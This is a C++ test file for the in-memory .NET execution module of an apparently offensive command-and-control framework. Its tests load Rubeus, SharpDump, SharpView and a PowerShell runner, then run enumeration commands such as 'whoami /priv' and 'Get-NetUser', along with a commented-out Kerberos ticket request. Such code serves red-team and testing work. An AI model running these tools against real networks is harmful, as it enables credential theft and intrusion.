#include "../DotnetExec.hpp"

#include <fstream>

#ifdef __linux__
#elif _WIN32
#include <windows.h>
#endif

bool testDotnetExec();

// int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) 
int main()
{
    bool res;

    // HANDLE hFile = CreateFile(TEXT("Foo.txt"), GENERIC_WRITE, FILE_READ_ACCESS | FILE_WRITE_ACCESS,
    // NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    // AllocConsole();
    // SetStdHandle(STD_OUTPUT_HANDLE, hFile);
    // SetStdHandle(STD_ERROR_HANDLE, hFile);

    std::cout << "[+] testDotnetExec" << std::endl;
    res = testDotnetExec();
    if (res)
       std::cout << "[+] Sucess" << std::endl;
    else
       std::cout << "[-] Failed" << std::endl;

    return !res;
}


bool testDotnetExec()
{
    std::unique_ptr<DotnetExec> dotnetExec = std::make_unique<DotnetExec>();

    // PowerShellRunner DLL
    {
        
        {
            std::vector<std::string> splitedCmd;
            splitedCmd.push_back("dotnetExec");
            splitedCmd.push_back("load");
            splitedCmd.push_back("ps");
            splitedCmd.push_back(".\\PowerShellRunner.dll");
            splitedCmd.push_back("PowerShellRunner.PowerShellRunner");

            C2Message c2Message;
            C2Message c2RetMessage;
            dotnetExec->init(splitedCmd, c2Message);
            dotnetExec->process(c2Message, c2RetMessage);

            std::string output = "\n\noutput:\n";
            output += c2RetMessage.returnvalue();
            output += "\n";
            std::cout << output << std::endl;
        }
        {
            std::string testString = "test";

            std::vector<std::string> splitedCmd;
            splitedCmd.push_back("dotnetExec");
            splitedCmd.push_back("runDll");
            splitedCmd.push_back("ps");
            splitedCmd.push_back("InvokePS");
            splitedCmd.push_back("echo");
            splitedCmd.push_back(testString);
            splitedCmd.push_back("|");
            splitedCmd.push_back("write-output");

            C2Message c2Message;
            C2Message c2RetMessage;
            dotnetExec->init(splitedCmd, c2Message);
            dotnetExec->process(c2Message, c2RetMessage);

            std::string output = "\n\noutput:\n";
            output += c2RetMessage.returnvalue();
            output += "\n";
            std::cout << output << std::endl;

            // if (c2RetMessage.returnvalue().compare(0, testString.length(), testString) == 0) 
            // {
            // } 
            // else 
            // {
            //     return false;
            // }
        }
        {
            std::vector<std::string> splitedCmd;
            splitedCmd.push_back("dotnetExec");
            splitedCmd.push_back("runDll");
            splitedCmd.push_back("ps");
            splitedCmd.push_back("InvokePS");
            splitedCmd.push_back("whoami /priv");
            splitedCmd.push_back("|");
            splitedCmd.push_back("write-output");

            C2Message c2Message;
            C2Message c2RetMessage;
            dotnetExec->init(splitedCmd, c2Message);
            dotnetExec->process(c2Message, c2RetMessage);

            std::string output = "\n\noutput:\n";
            output += c2RetMessage.returnvalue();
            output += "\n";
            std::cout << output << std::endl;
        }
    }

    // Rubeus EXE
    {
        {
            std::vector<std::string> splitedCmd;
            splitedCmd.push_back("dotnetExec");
            splitedCmd.push_back("load");
            splitedCmd.push_back("ru");
            splitedCmd.push_back(".\\SharpView.exe");

            C2Message c2Message;
            C2Message c2RetMessage;
            dotnetExec->init(splitedCmd, c2Message);
            dotnetExec->process(c2Message, c2RetMessage);

            std::string output = "\n\noutput:\n";
            output += c2RetMessage.returnvalue();
            output += "\n";
            std::cout << output << std::endl;

            if (c2RetMessage.errorCode()) 
            {
                std::string errorMsg;
                dotnetExec->errorCodeToMsg(c2RetMessage, errorMsg);
                std::cout << "[+] errorCode: \n" << c2RetMessage.errorCode() << std::endl;
                std::cout << "[+] error: \n" << errorMsg << std::endl;
            } 
        }
        {
            std::vector<std::string> splitedCmd;
            splitedCmd.push_back("dotnetExec");
            splitedCmd.push_back("runExe");
            splitedCmd.push_back("ru");
            splitedCmd.push_back("Get-NetUser");

            C2Message c2Message;
            C2Message c2RetMessage;
            dotnetExec->init(splitedCmd, c2Message);
            dotnetExec->process(c2Message, c2RetMessage);

            std::string output = "\n\noutput:\n";
            output += c2RetMessage.returnvalue();
            output += "\n";
            std::cout << output << std::endl;

            if (c2RetMessage.errorCode()) 
            {
                std::string errorMsg;
                dotnetExec->errorCodeToMsg(c2RetMessage, errorMsg);
                std::cout << "[+] error: \n" << errorMsg << std::endl;
                std::cout << "[+] errorCode: \n" << c2RetMessage.errorCode() << std::endl;
            } 
        }
    }

    // load 2 EXE back to back
    {
        {
            std::vector<std::string> splitedCmd;
            splitedCmd.push_back("dotnetExec");
            splitedCmd.push_back("load");
            splitedCmd.push_back("sd");
            splitedCmd.push_back(".\\SharpDump.exe");

            C2Message c2Message;
            C2Message c2RetMessage;
            dotnetExec->init(splitedCmd, c2Message);
            dotnetExec->process(c2Message, c2RetMessage);

            std::string output = "\n\noutput:\n";
            output += c2RetMessage.returnvalue();
            output += "\n";
            std::cout << output << std::endl;

            if (c2RetMessage.errorCode()) 
            {
                std::string errorMsg;
                dotnetExec->errorCodeToMsg(c2RetMessage, errorMsg);
                std::cout << "[+] error: \n" << errorMsg << std::endl;
                std::cout << "[+] errorCode: \n" << c2RetMessage.errorCode() << std::endl;
            } 
        }   
        {
            std::vector<std::string> splitedCmd;
            splitedCmd.push_back("dotnetExec");
            splitedCmd.push_back("runExe");
            splitedCmd.push_back("sd");
            splitedCmd.push_back("help");

            C2Message c2Message;
            C2Message c2RetMessage;
            dotnetExec->init(splitedCmd, c2Message);
            dotnetExec->process(c2Message, c2RetMessage);

            std::string output = "\n\noutput:\n";
            output += c2RetMessage.returnvalue();
            output += "\n";
            std::cout << output << std::endl;

            if (c2RetMessage.errorCode()) 
            {
                std::string errorMsg;
                dotnetExec->errorCodeToMsg(c2RetMessage, errorMsg);
                std::cout << "[+] error: \n" << errorMsg << std::endl;
                std::cout << "[+] errorCode: \n" << c2RetMessage.errorCode() << std::endl;
            } 
        }

        {
            std::vector<std::string> splitedCmd;
            splitedCmd.push_back("dotnetExec");
            splitedCmd.push_back("load");
            splitedCmd.push_back("ru2");
            splitedCmd.push_back(".\\Rubeus.exe");

            C2Message c2Message;
            C2Message c2RetMessage;
            dotnetExec->init(splitedCmd, c2Message);
            dotnetExec->process(c2Message, c2RetMessage);

            std::string output = "\n\noutput:\n";
            output += c2RetMessage.returnvalue();
            output += "\n";
            std::cout << output << std::endl;

            if (c2RetMessage.errorCode()) 
            {
                std::string errorMsg;
                dotnetExec->errorCodeToMsg(c2RetMessage, errorMsg);
                std::cout << "[+] error: \n" << errorMsg << std::endl;
                std::cout << "[+] errorCode: \n" << c2RetMessage.errorCode() << std::endl;
            } 
        }

        {
            std::vector<std::string> splitedCmd;
            splitedCmd.push_back("dotnetExec");
            splitedCmd.push_back("runExe");
            splitedCmd.push_back("ru2");
            splitedCmd.push_back("currentluid");

            C2Message c2Message;
            C2Message c2RetMessage;
            dotnetExec->init(splitedCmd, c2Message);
            dotnetExec->process(c2Message, c2RetMessage);

            std::string output = "\n\noutput:\n";
            output += c2RetMessage.returnvalue();
            output += "\n";
            std::cout << output << std::endl;

            if (c2RetMessage.errorCode()) 
            {
                std::string errorMsg;
                dotnetExec->errorCodeToMsg(c2RetMessage, errorMsg);
                std::cout << "[+] error: \n" << errorMsg << std::endl;
                std::cout << "[+] errorCode: \n" << c2RetMessage.errorCode() << std::endl;
            } 
        }
    }

    // // handle crash ?
    // {

    //     {
    //         std::vector<std::string> splitedCmd;
    //         splitedCmd.push_back("dotnetExec");
    //         splitedCmd.push_back("load");
    //         splitedCmd.push_back("ru");
    //         splitedCmd.push_back(".\\Rubeus.exe");

    //         C2Message c2Message;
    //         C2Message c2RetMessage;
    //         dotnetExec->init(splitedCmd, c2Message);
    //         dotnetExec->process(c2Message, c2RetMessage);

    //         std::string output = "\n\noutput:\n";
    //         output += c2RetMessage.returnvalue();
    //         output += "\n";
    //         std::cout << output << std::endl;
    //     }   
    //     {
    //         std::vector<std::string> splitedCmd;
    //         splitedCmd.push_back("dotnetExec");
    //         splitedCmd.push_back("runExe");
    //         splitedCmd.push_back("ru");
    //         splitedCmd.push_back("asktgt /user:User");

    //         C2Message c2Message;
    //         C2Message c2RetMessage;
    //         dotnetExec->init(splitedCmd, c2Message);
    //         dotnetExec->process(c2Message, c2RetMessage);

    //         std::string output = "\n\noutput:\n";
    //         output += c2RetMessage.returnvalue();
    //         output += "\n";
    //         std::cout << output << std::endl;
    //     }
    // }


    // handle EXE / DLL confusion ?
    // {


    //     {
    //         std::vector<std::string> splitedCmd;
    //         splitedCmd.push_back("dotnetExec");
    //         splitedCmd.push_back("load");
    //         splitedCmd.push_back(".\\Rubeus.exe");

    //         C2Message c2Message;
    //         C2Message c2RetMessage;
    //         dotnetExec->init(splitedCmd, c2Message);
    //         dotnetExec->process(c2Message, c2RetMessage);

    //         std::string output = "\n\noutput:\n";
    //         output += c2RetMessage.returnvalue();
    //         output += "\n";
    //         std::cout << output << std::endl;
    //     }   
    //     {
    //         std::vector<std::string> splitedCmd;
    //         splitedCmd.push_back("dotnetExec");
    //         splitedCmd.push_back("runDll");
    //         splitedCmd.push_back("toto");
    //         splitedCmd.push_back("asktgt ");
    //         splitedCmd.push_back("/user:User");

    //         C2Message c2Message;
    //         C2Message c2RetMessage;
    //         dotnetExec->init(splitedCmd, c2Message);
    //         dotnetExec->process(c2Message, c2RetMessage);

    //         std::string output = "\n\noutput:\n";
    //         output += c2RetMessage.returnvalue();
    //         output += "\n";
    //         std::cout << output << std::endl;
    //     }
    // }
    // {

    //     {
    //         std::vector<std::string> splitedCmd;
    //         splitedCmd.push_back("dotnetExec");
    //         splitedCmd.push_back("load");
    //         splitedCmd.push_back(".\\PowerShellRunner.dll");

    //         C2Message c2Message;
    //         C2Message c2RetMessage;
    //         dotnetExec->init(splitedCmd, c2Message);
    //         dotnetExec->process(c2Message, c2RetMessage);

    //         std::string output = "\n\noutput:\n";
    //         output += c2RetMessage.returnvalue();
    //         output += "\n";
    //         std::cout << output << std::endl;
    //     }
    //     {
    //         std::string testString = "test";

    //         std::vector<std::string> splitedCmd;
    //         splitedCmd.push_back("dotnetExec");
    //         splitedCmd.push_back("runExe");
    //         splitedCmd.push_back("write-output");

    //         C2Message c2Message;
    //         C2Message c2RetMessage;
    //         dotnetExec->init(splitedCmd, c2Message);
    //         dotnetExec->process(c2Message, c2RetMessage);

    //         std::string output = "\n\noutput:\n";
    //         output += c2RetMessage.returnvalue();
    //         output += "\n";
    //         std::cout << output << std::endl;
    //     }
    // }


    std::cout << "End of tests " << std::endl;

    return true;
}